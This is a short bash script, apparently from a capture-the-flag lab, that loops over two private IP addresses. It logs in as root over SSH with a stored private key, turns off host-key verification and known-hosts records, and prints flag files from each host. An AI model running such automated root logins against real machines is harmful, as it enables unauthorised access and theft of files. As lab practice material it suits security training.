for i in $(seq 128 129); 
do
  echo "192.168.231.$i"
  ssh -o "BatchMode=Yes" -o "StrictHostKeyChecking=no" -o "GlobalKnownHostsFile=/dev/null" -o "UserKnownHostsFile=/dev/null" root@192.168.231.$i -i /home/kali/Desktop/apache/key "cat /home/kali/Desktop/apache/flag.txt; echo; /var/flag; echo" 2>/dev/null
done
